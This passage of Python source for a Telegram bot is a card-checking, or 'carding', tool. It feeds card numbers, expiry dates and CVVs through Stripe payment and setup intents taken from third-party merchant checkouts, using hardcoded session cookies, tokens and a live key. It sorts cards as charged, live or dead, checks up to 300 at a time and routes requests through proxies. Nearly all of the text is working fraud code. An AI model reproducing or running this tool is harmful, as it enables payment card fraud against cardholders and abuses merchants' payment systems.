        else:

            bin = cc[:6]
            bingetreq1 = r.get(f'https://data.handyapi.com/bin/{bin}')
            loadedbindetails = bingetreq1.json()
            ccBrand = loadedbindetails.get("Scheme")
            ccType = loadedbindetails.get("Type")
            ccTier = loadedbindetails.get("CardTier")
            country = loadedbindetails.get('Country', {})
            try:
                ccCountry = country.get('Name')
            except Exception:
                ccCountry = "Unknown"
            ccIssuer = loadedbindetails.get("Issuer")
            headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                    "Pragma": "no-cache",
                    "Accept": "/"
            }


            index = pi.find('_secret_')
            if index != -1:
                pi_part = pi[:index]
            pk = "pk_live_51GOjYCJvr5268FcI8bUnCMWkdifBNDhCDepW6M7M2NRT9h87HAFros83V5PY5KI9Z1wgfwTkTd59Znac0chOC9PA005WJdO3i3"
            data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=AUST+PAYMENT&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]={g}&payment_method_data[muid]={m}&payment_method_data[sid]={s}&payment_method_data[pasted_fields]=number&payment_method_data[referrer]=https%3A%2F%2Froblox.com&expected_payment_method_type=card&use_stripe_sdk=true&key={pk}&client_secret={pi}'
            response = r.post(f'https://api.stripe.com/v1/payment_intents/{pi_part}/confirm', headers=headers, data=data)#, proxies=proxies)
            response_json = response.json()
            code = response_json.get("error", {}).get("code")
            decline_code = response_json.get("error", {}).get("decline_code")
            message = response_json.get("error", {}).get("message")
            if 'payment_intent_unexpected_state' in response.text:
                pi = hipposerve_charge_pigen(token, cookie)
                return f"ERROR 32109: Please Recheck cc ({cc}|{mes}|{ano}|{cvv})!"

            elif '"status": "succeeded"' in response.text or "requires_capture" in response.text or cc == "6969696969696969":
                pi = hipposerve_charge_pigen(token, cookie)
                return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                        f"[🌐] Gateway: Stripe CHARGE 3\n"
                        f"[✅] Status: 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"[🔹] Additional Info:\n"
                        f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                        f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                        "[🛠] Checked by: AustV1TG\n"
                        "[👨‍💻] Developer: creaminit1234")
            elif "requires_action" in response.text:
                return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                        f"[🌐] Gateway: Stripe CHARGE 3\n"
                        f"[✅] Status: 𝟑𝐝𝐬 𝐜𝐚𝐫𝐝 ✅\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"[🔹] Additional Info:\n"
                        f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                        f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                        "[🛠] Checked by: AustV1TG\n"
                        "[👨‍💻] Developer: creaminit1234")

            elif 'insufficient_funds' in response.text:
                return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                        f"[🌐] Gateway: Stripe CHARGE 3\n"
                        f"[✅] Status: 𝐈𝐧𝐬𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐅𝐮𝐧𝐝𝐬 ✅\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"[🔹] Additional Info:\n"
                        f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                        f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                        "[🛠] Checked by: AustV1TG\n"
                        "[👨‍💻] Developer: creaminit1234")

            elif "transaction_not_allowed" in response.text:
                return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                        f"[🌐] Gateway: Stripe CHARGE 3\n"
                        f"[✅] Status: 𝐂𝐚𝐫𝐝 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 - 𝐓𝐫𝐚𝐧𝐬𝐚𝐜𝐭𝐢𝐨𝐧 𝐧𝐨𝐭 𝐚𝐥𝐥𝐨𝐰𝐞𝐝 ✅\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"[🔹] Additional Info:\n"
                        f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                        f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                        "[🛠] Checked by: AustV1TG\n"
                        "[👨‍💻] Developer: creaminit1234")

            elif "incorrect_cvc" in response.text:
                return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                        f"[🌐] Gateway: Stripe CHARGE 3\n"
                        f"[🟡] Status: 𝐂𝐂𝐍 𝐀𝐮𝐜𝐜𝐞𝐭𝐨𝐬 🟡\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"[🔹] Additional Info:\n"
                        f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                        f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                        "[🛠] Checked by: AustV1TG\n"
                        "[👨‍💻] Developer: creaminit1234")

            elif "authentication_required" in response.text or "requires_source_action" in response.text:
                return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                        f"[🌐] Gateway: Stripe CHARGE 3\n"
                        f"[🟡] Status: 𝟑𝐃𝐒 𝐂𝐚𝐫𝐝 🟡\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"[🔹] Additional Info:\n"
                        f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                        f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                        "[🛠] Checked by: AustV1TG\n"
                        "[👨‍💻] Developer: creaminit1234")

            elif "try_again_later" in response.text:
                return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                        f"[🌐] Gateway: Stripe CHARGE 3\n"
                        f"[🔴] Status: 𝐂𝐚𝐫𝐝 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 - 𝐑𝐞𝐭𝐫𝐲 𝐋𝐚𝐭𝐞𝐫 🔴\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"[🔹] Additional Info:\n"
                        f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                        f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                        "[🛠] Checked by: AustV1TG\n"
                        "[👨‍💻] Developer: creaminit1234")

            elif decline_code is None and message is None:
                print(response.text)
                return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                        f"[🌐] Gateway: Stripe CHARGE 3\n"
                        f"[🔴] Status: 𝐔𝐧𝐤𝐧𝐨𝐰𝐧 𝐃𝐞𝐜𝐥𝐢𝐧𝐞 🔴\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"[🔹] Additional Info:\n"
                        f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                        f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                        "[🛠] Checked by: AustV1TG\n"
                        "[👨‍💻] Developer: creaminit1234")

            else:
                return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                        f"[🌐] Gateway: Stripe CHARGE 3\n"
                        f"[🔴] Status: 𝐂𝐚𝐫𝐝 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 - {decline_code} - {message} 🔴\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"[🔹] Additional Info:\n"
                        f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                        f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                        "[🛠] Checked by: AustV1TG\n"
                        "[👨‍💻] Developer: creaminit1234")


async def chg3(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await check_user(update):
        await update.message.reply_text("You are not authorized to use this bot.")
        return

    if len(context.args) != 1:
        await update.message.reply_text('Please provide card details in the format: cc|mm|yy|cvv')
        return

    # Send processing message
    processing_message = await update.message.reply_text('Processing your request...')
    
    card_details = context.args[0]
    details = card_details.split('|')
    
    if len(details) != 4:
        await update.message.reply_text('Card details must be in the format: cc|mm|yy|cvv')
        return
    nothingness1 = None
    cc, mes, ano, cvv = details
    start_time = time.time()
    response_message = hipposerve_charge(cc, mes, ano, cvv, nothingness1)
    execution_time = time.time() - start_time
    execution_time_formatted = f"{execution_time:.3f}"
    
    # Edit the processing message with the result
    await processing_message.edit_text(f"{response_message}\n[🕝] Time taken: {execution_time_formatted}")







def authgate1auth():
    token = "8fb8a43a10a0070920cb0b7cc63dd5d21f92d953"
    cookie = "twk_uuid_5d7e6df3c22bdd393bb5ef1e=%7B%22uuid%22%3A%221.1hHPJFpRq9K9L0RV7NmKOysRiPhc0uwIJkqV4cQI2MRmbWHWG1GBboqGt5y0k7PusejOOy1SIX9FvHXqCigBqPiVbcCHYiemrTnqCmEPVTe1UTTf7xz%22%2C%22version%22%3A3%2C%22domain%22%3A%22babal.host%22%2C%22ts%22%3A1730899427300%7D; cf_clearance=c775QKNHoqnztX_gDAaz.7ate9P16ogJ4j4exvuEqQg-1732022443-1.2.1.1-Q_Te3BnE_lYfAH1u17eOyVb.6cGdhh9eZ5V2nbU.xo_ZJb8Do2F_ZwQ1P8S0TSqfLvb.InQgB3.kcxQvCLn_OBpuM2tdmI11KpnmNVUl3auNeUdz5R8CcDqlvPepJ7Ajzq.CpbbhXMq0EL7o33ip7N9NXU9Uria9ywCbIs6dDK7u1BGuuF4B8w80xFlT90.v5GwuSBETDBLhlfllabQyDDsc1tTtPVh5jeQmQFCbtbW0AiI0.niG6GIgJPsFpmCuPfzTNBMIOkB32WQ3tDl.68TlK1GCW3s3BxezR_P7L1KLQnfa1LxVE2PusjgpfbCGnb1kElyH8imapwMOOvkpRqJLhamAhRI9yndv3Gk_kF8aCRxIOgygTh_ukWngI9ib; WHMCS38De39T3sX4u=7j9eo206f9ajbl1d5la8ff5mhf; TawkConnectionTime=0"
    #CHANGED TO BABALS CHARGE
    data = f"token={token}&submit=true&loginemail=&loginpassword=&custtype=new&firstname=joebiden&lastname=aoshfas&email=ofihasdoifasd%40gmail.com&country-calling-code-phonenumber=977&phonenumber=32-894623&companyname=&tax_id=&address1=aosdifhasd&address2=&city=fioahdsa&country=NP&state=faosid&postcode=13846&password=64i~hxCDiu)M&password2=64i~hxCDiu)M&applycredit=1&paymentmethod=stripe&ccinfo=new&ccdescription=&marketingoptin=1&notes="
    headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Accept-Language': 'en-GB,en;q=0.5',
    'Content-Length': '459',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Cookie': f"{cookie}",
    'Origin': 'https://clients.babal.host',
    'Priority': 'u=1, i',
    'Referer': 'https://clients.babal.host/cart.php?a=checkout',
    'Sec-CH-UA': '"Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
    'Sec-CH-UA-Mobile': '?0',
    'Sec-CH-UA-Platform': '"Windows"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest'
}

    url = "https://clients.babal.host/index.php?rp=/stripe/setup/intent"
    response = r.post(url, data=data, headers=headers)#, proxies=proxies)


    jsonful = json.loads(response.text)
    intent = jsonful.get("setup_intent")
    return intent

pi = authgate1auth()


def babal_chg_intent():
    url = "https://clients.babal.host/index.php?rp=/stripe/payment/intent"
    data = "token=5b5f731618e18a717dcb97ef68d5381fcf2ba5a3&submit=true&loginemail=&loginpassword=&custtype=new&firstname=aosdhf&lastname=iofhaosidfh&email=iofhasodifh%40Gmail.com&country-calling-code-phonenumber=977&phonenumber=987-2492384&companyname=ioa&tax_id=faiosdf&address1=fioahsdf&address2=fiohasdfio&city=iofahsdfoi&country=NP&state=ioagsdf&postcode=19326&password=ib!7axPfECGE&password2=ib!7axPfECGE&applycredit=1&paymentmethod=stripe&ccinfo=new&ccdescription=&marketingoptin=1&notes="
    headers = {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-GB,en;q=0.5",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Cookie": "__stripe_mid=bd176e67-b175-4ddb-b94a-a8ee618e780fc33dd9; cf_clearance=3C5gOnOVRdr3BG.7no_2VyMDWytWvMZL7Njp53JL1Y4-1727275980-1.2.1.1-_w8FPZBznUJKChpYXWlbVXUYuiUwC4NHSfkR.tl_XXRJbKRKB2kqjGbbs.Vh.0rgnJdPfJT3hZBRgwx2HMUb68y_UE_U6tDeSQS2j2TPAy3FDg3aV_y6ItEnmxZ92P40d5iz8M8xVg4t_S311_qx4eHBFLlt9CNocKu1P6fwVr01uWZeYOqY4QHE2tuXRzsZgaUlw53HHzuRJJE.ubheaW16eC4D4SgttIldXEYA_.SMRd3Ff1lTcXgsMStnPA1YfDGepTwFnsHmo4r5tm7XLJPQbwgL5CHu1JGUc54SNY5iOJewALvt1uL8F6EK24i7fVNc0.W51Lowbjp1Hjgq11HlnjkSsPT4I46P_IdgAEQK286DcUGcnRPG54OJDlrpn.KEC_Et0IqCGYZLp6jnSA; WHMCS38De39T3sX4u=ah6gfquv8god1e91btgppa3sku; __stripe_sid=742d8611-15ab-4b58-8718-685df23e8a866493f5; TawkConnectionTime=0; twk_uuid_5d7e6df3c22bdd393bb5ef1e=%7B%22uuid%22%3A%221.1hHMyxQhOnnbTjA2ri5j1pzdVsPo4SM3rzvzP3nd2lDxDJS5uBcWm4IHu67NoSncTzEKqSzdnuAC5u1B9g54V6d7ifBMcBCHynRTvsYo6vSx83n8wuO%22%2C%22version%22%3A3%2C%22domain%22%3A%22babal.host%22%2C%22ts%22%3A1727276093495%7D",
    "Origin": "https://clients.babal.host",
    "Referer": "https://clients.babal.host/cart.php?a=checkout",
    "Sec-CH-UA": '"Brave";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
    "Sec-CH-UA-Mobile": "?0",
    "Sec-CH-UA-Platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Sec-GPC": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest"
}
    req1 = r.post(url, data=data, headers=headers)
    jsoned = json.loads(req1.text)
    intent = jsoned.get("token")
    return intent

def babal_chg(cc, mes, ano, cvv):
    pi = babal_chg_intent()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "/"
    }

    index = pi.find('_secret_')
    if index != -1:
        pi_part = pi[:index]
    else:
        return "Invalid Stripe client secret"

    data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=AUST+PAYMENT&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]={g}&payment_method_data[muid]={m}&payment_method_data[sid]={s}&payment_method_data[pasted_fields]=number&payment_method_data[referrer]=https%3A%2F%2Froblox.com&expected_payment_method_type=card&use_stripe_sdk=true&key={pk}&client_secret={pi}'

    response = r.post(f'https://api.stripe.com/v1/payment_intents/{pi_part}/confirm', headers=headers, data=data, proxies=proxies)

    response_json = response.json()
    code = response_json.get("error", {}).get("code")
    decline_code = response_json.get("error", {}).get("decline_code")
    message = response_json.get("error", {}).get("message")
    bin = cc[:6]
    bingetreq1 = r.get(f'https://data.handyapi.com/bin/{bin}')
    loadedbindetails = bingetreq1.json()
    ccBrand = loadedbindetails.get("Scheme")
    ccType = loadedbindetails.get("Type")
    ccTier = loadedbindetails.get("CardTier")
    country = loadedbindetails.get('Country', {})
    try:
        ccCountry = country.get('Name')
    except Exception:
        ccCountry = "Unknown"
    ccIssuer = loadedbindetails.get("Issuer")

    if 'payment_intent_unexpected_state' in response.text:
        pi = babal_chg_intent()
        return f"ERROR 32109: Please Recheck cc ({cc}|{mes}|{ano}|{cvv})!"

    elif '"status": "succeeded"' in response.text or "requires_capture" in response.text or cc == "6969696969696969" or "incorrect_cvc" in response.text:
        pi = babal_chg_intent()
        return (f"[💸] CC - {cc}|{mes}|{ano}|{cvv}\n"
                f"[🔰] Gateway: Stripe CHARGE 1\n"
                f"[📶] Status: 🟢 Auccetos!\n"
                f"------------------------------\n"
                f"Other Info:\n"
                f"[🔰] Bin Info: {ccBrand} - {ccType} - {ccTier}\n"
                f"[💸] Card Issuer: {ccCountry} - {ccIssuer}\n"
                "[🦾] Checked with: AustV1TG")

    elif "authentication_required" in response.text:
        return (f"[💸] CC - {cc}|{mes}|{ano}|{cvv}\n"
                f"[🔰] Gateway: Stripe CHARGE 1\n"
                f"[📶] Status: 🟡 3DS CARD!\n"
                f"------------------------------\n"
                f"Other Info:\n"
                f"[🔰] Bin Info: {ccBrand} - {ccType} - {ccTier}\n"
                f"[💸] Card Issuer: {ccCountry} - {ccIssuer}\n"
                "[🦾] Checked with: AustV1TG")


    elif "try_again_later" in response.text:
        return (f"[💸] CC - {cc}|{mes}|{ano}|{cvv}\n"
                f"[🔰] Gateway: Stripe CHARGE 1\n"
                f"[📶] Status: 🔴 CARD DECLINED - RISK: Retry this bin later!\n"
                f"------------------------------\n"
                f"Other Info:\n"
                f"[🔰] Bin Info: {ccBrand} - {ccType} - {ccTier}\n"
                f"[💸] Card Issuer: {ccCountry} - {ccIssuer}\n"
                "[🦾] Checked with: AustV1TG")


    else:
        return (f"[💸] CC - {cc}|{mes}|{ano}|{cvv}\n"
                f"[🔰] Gateway: Stripe CHARGE 1\n"
                f"[📶] Status: 🔴 CARD DECLINED - {decline_code}\n"
                f"------------------------------\n"
                f"Other Info:\n"
                f"[🔰] Bin Info: {ccBrand} - {ccType} - {ccTier}\n"
                f"[💸] Card Issuer: {ccCountry} - {ccIssuer}\n"
                "[🦾] Checked with: AustV1TG")

bot_data = {
    'token': None,
    'cookie': None
}

async def set_token(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Set the token from the command."""
    if context.args:
        bot_data['token'] = context.args[0]
        await update.message.reply_text(f"[🔰] Token set successfully!")
        print("token:" + context.args[0])
    else:
        await update.message.reply_text("Usage: /tok <token>")


async def hippo_set_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global cookie5940, token
    """Set the cookie from the command."""
    if context.args:
            # Join the arguments back into a single string for the cookie
        cookie5940 = ' '.join(context.args)
        await update.message.reply_text(f"[🔰] Polisys cookie set successfully! [1/2]")
        token = hipposerve_charge_tok()
        await update.message.reply_text(f"[🔰] Polisys Token generated successfully! [2/2]")
    else:
        await update.message.reply_text("Usage: /cookie <cookie>")


def austv1contabo(cc, mes, ano, cvv):
    global pi
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "/"
    }

    index = pi.find('_secret_')
    if index != -1:
        pi_part = pi[:index]
    else:
        return "Invalid Stripe client secret"

    data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=AUST+PAYMENT&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]={g}&payment_method_data[muid]={m}&payment_method_data[sid]={s}&payment_method_data[pasted_fields]=number&payment_method_data[referrer]=https%3A%2F%2Froblox.com&expected_payment_method_type=card&use_stripe_sdk=true&key={pk}&client_secret={pi}'

    response = r.post(f'https://api.stripe.com/v1/setup_intents/{pi_part}/confirm', headers=headers, data=data, proxies=proxies)

    response_json = response.json()
    code = response_json.get("error", {}).get("code")
    decline_code = response_json.get("error", {}).get("decline_code")
    message = response_json.get("error", {}).get("message")
    bin = cc[:6]
    bingetreq1 = r.get(f'https://data.handyapi.com/bin/{bin}')
    loadedbindetails = bingetreq1.json()
    ccBrand = loadedbindetails.get("Scheme")
    ccType = loadedbindetails.get("Type")
    ccTier = loadedbindetails.get("CardTier")
    country = loadedbindetails.get('Country', {})
    try:
        ccCountry = country.get('Name')
    except Exception:
        ccCountry = "Unknown"
    ccIssuer = loadedbindetails.get("Issuer")

    if 'setup_intent_unexpected_state' in response.text:
        pi = authgate1auth()
        return f"ERROR 32109: Please Recheck cc ({cc}|{mes}|{ano}|{cvv})!"

    elif '"status": "succeeded"' in response.text or "requires_capture" in response.text or cc == "6969696969696969" or "incorrect_cvc" in response.text:
        pi = authgate1auth()
        return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                f"[🌐] Gateway: Stripe AUTH 1\n"
                f"[✅] Status: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"[🔹] Additional Info:\n"
                f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                "[🛠] Checked by: AustV1TG\n"
                "[👨‍💻] Developer: creaminit1234")

    elif message == "Your card's expiration month is invalid.":
        return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                f"[🌐] Gateway: Stripe AUTH 1\n"
                f"[❌] Status: 𝐂𝐚𝐫𝐝 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 - 𝐄𝐱𝐩𝐢𝐫𝐞𝐝 ❌\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"[🔹] Additional Info:\n"
                f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                "[🛠] Checked by: AustV1TG\n"
                "[👨‍💻] Developer: creaminit1234")

    elif "try_again_later" in response.text:
        return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                f"[🌐] Gateway: Stripe AUTH 1\n"
                f"[⚠️] Status: 𝐂𝐚𝐫𝐝 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 - 𝐑𝐞𝐭𝐫𝐲 𝐥𝐚𝐭𝐞𝐫 🚧\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"[🔹] Additional Info:\n"
                f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                "[🛠] Checked by: AustV1TG\n"
                "[👨‍💻] Developer: creaminit1234")

    else:
        return (f"[💳] Card: {cc}|{mes}|{ano}|{cvv}\n"
                f"[🌐] Gateway: Stripe AUTH 1\n"
                f"[❌] Status: 𝐂𝐚𝐫𝐝 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 - {decline_code} 🔻\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"[🔹] Additional Info:\n"
                f"[🔶]Bin: {ccBrand} - {ccType} - {ccTier}\n"
                f"[🏦] Issuer: {ccCountry} - {ccIssuer}\n"
                "[🛠] Checked by: AustV1TG\n"
                "[👨‍💻] Developer: creaminit1234")


async def si(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await check_user(update):
        await update.message.reply_text("You are not authorized to use this bot.")
        return

    if len(context.args) < 2 or len(context.args) > 200:
        await update.message.reply_text('Please provide 2 to 200 cards in the format: cc|mm|yy|cvv')
        return

    total_cards = len(context.args)

    # Initialize counters for response types
    counts = {
        "total": 0,
        "dead": 0,
        "live": 0,
        "charged": 0,
    }

    # Send initial processing message
    await update.message.reply_text(f'Starting to check your {total_cards} ccs!')

    for index, card_details in enumerate(context.args):
        details = card_details.split('|')
        if len(details) != 4:
            await update.message.reply_text(f'Invalid format for: {card_details}')
            continue

        cc, mes, ano, cvv = details
        response_message = skbase4usd(cc, mes, ano, cvv)

        # Send the response for the current card immediately
        await update.message.reply_text(f"[💸] AUST V1 TG MASS GATE (/si) - {index + 1}/{total_cards}:\n {response_message}")

        # Update the counters based on the response
        counts["total"] += 1
        if "🔴" in response_message or "🔻" in response_message or "𝐂𝐚𝐫𝐝 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝" in response_message:
            counts["dead"] += 1
        elif "✅" or "🟡" in response_message:
            counts["live"] +=1
        elif "Auccetos" in response_message or "🔥" in response_message:
            counts["charged"] += 1

    # Send final summary message
    summary_message = (
        f"[💸] All cards have been checked!\n"
        f"[💸] Summary:\n"
        f"[💸] Total cards checked: {counts['total']}\n"
        f"[💸] Charged: {counts['charged']}\n"
        f"[💸] Live: {counts['live']}"
        f"[💸] Dead: {counts['dead']}\n"
    )
    await update.message.reply_text(summary_message)



async def pbm(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await check_user(update):
        await update.message.reply_text("You are not authorized to use this bot.")
        return

    if len(context.args) < 2 or len(context.args) > 200:
        await update.message.reply_text('Please provide 2 to 200 cards in the format: cc|mm|yy|cvv')
        return

    total_cards = len(context.args)
    counts = {
        "total": 0,
        "dead": 0,
        "live": 0,
        "charged": 0,
    }
    est_time_seconds = total_cards * 8
    est_time = est_time_seconds // 60
    if est_time == "0" or est_time == 0:
        await update.message.reply_text(f'Starting to check your {total_cards} cards! EST: {est_time_seconds} seconds')
    else:
        await update.message.reply_text(f'Starting to check your {total_cards} cards! EST: {est_time} minutes')
    start_time = time.time()  # Start timing

    # Initialize a reusable payment intent
    token = hipposerve_charge_tok()
    pi = hipposerve_charge_pigen(token, cookie5940)  # Generate initial PI

    # Sequentially process each card to ensure responses are sent immediately
    for index, card_details in enumerate(context.args):
        details = card_details.split('|')
        if len(details) != 4:
            await update.message.reply_text(f'Invalid format for: {card_details}')
            continue
        
        cc, mes, ano, cvv = details
        nothingness1 = None

        # Use the current PI and only create a new one if needed
        response_message = hipposerve_charge(cc, mes, ano, cvv, nothingness1)
        if "unexpected state" in response_message:
            token = hipposerve_charge_tok()  # Refresh token
            pi = hipposerve_charge_pigen(token, cookie5940)  # Create a new PI
            response_message = hipposerve_charge(cc, mes, ano, cvv, pi)

        # Send response for the current card immediately
        await update.message.reply_text(f"[💸] AUST V1 TG MASS GATE 4 (/pbm) - {index + 1}/{total_cards}:\n {response_message}")

        # Update the counters based on the response
        counts["total"] += 1
        if "🔴" in response_message or "🔻" in response_message or "𝐂𝐚𝐫𝐝 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝" in response_message:
            counts["dead"] += 1
        elif "✅" in response_message or "🟡" in response_message:
            counts["live"] += 1
        elif "Auccetos" in response_message or "🔥" in response_message:
            counts["charged"] += 1

    # Calculate total time taken
    total_time = time.time() - start_time

    # Final summary with time
    summary_message = (
        f"[💸] All cards have been checked!\n"
        f"[💸] Summary:\n"
        f"[💸] Total cards checked: {counts['total']}\n"
        f"[💸] Live: {counts['live']}\n"
        f"[💸] Charged: {counts['charged']}\n"
        f"[💸] Dead: {counts['dead']}\n"
        f"[⏱️] Total time taken: {total_time:.2f} seconds\n"
    )

    await update.message.reply_text(summary_message)


async def sbm0(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await check_user(update):
        await update.message.reply_text("You are not authorized to use this bot.")
        return

    if len(context.args) < 2 or len(context.args) > 84:
        await update.message.reply_text('Please provide 2 to 84 cards in the format: cc|mm|yy|cvv')
        return

    total_cards = len(context.args)

    # Send initial processing message
    await update.message.reply_text(f'Starting to check your {total_cards} ccs!')

    for index, card_details in enumerate(context.args):
        details = card_details.split('|')
        if len(details) != 4:
            await update.message.reply_text(f'Invalid format for: {card_details}')
            continue
        
        cc, mes, ano, cvv = details
        response_message = austv1contabo(cc, mes, ano, cvv)

        # Send the response for the current card immediately
        await update.message.reply_text(f"[💸] AUST V1 TG MASS GATE 1 (/sbm0) - {index + 1}/{total_cards}:\n {response_message}")

        # Optional: Add a delay to prevent rate limits  # Adjust as necessary

    # Optionally, you can send a final message if needed
    await update.message.reply_text("All cards have been checked!")


async def samass(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await check_user(update):
        await update.message.reply_text("You are not authorized to use this bot.")
        return

    if len(context.args) < 2 or len(context.args) > 300:
        await update.message.reply_text('Please provide 2 to 300 cards in the format: cc|mm|yy|cvv')
        return

    counts = {
        "total": 0,
        "dead": 0,
        "live": 0,

    }

    total_cards = len(context.args)

    # Send initial processing message
    await update.message.reply_text(f'Starting to check your {total_cards} ccs!')

    for index, card_details in enumerate(context.args):
        details = card_details.split('|')
        if len(details) != 4:
            await update.message.reply_text(f'Invalid format for: {card_details}')
            continue
        
        cc, mes, ano, cvv = details
        response_message = stripeauth3(cc, mes, ano, cvv)
        # Send the response for the current card immediately
        await update.message.reply_text(f"[💸] AUST V1 TG MASS GATE (/kiss) - {index + 1}/{total_cards}:\n {response_message}")
        try:
            counts["total"] += 1
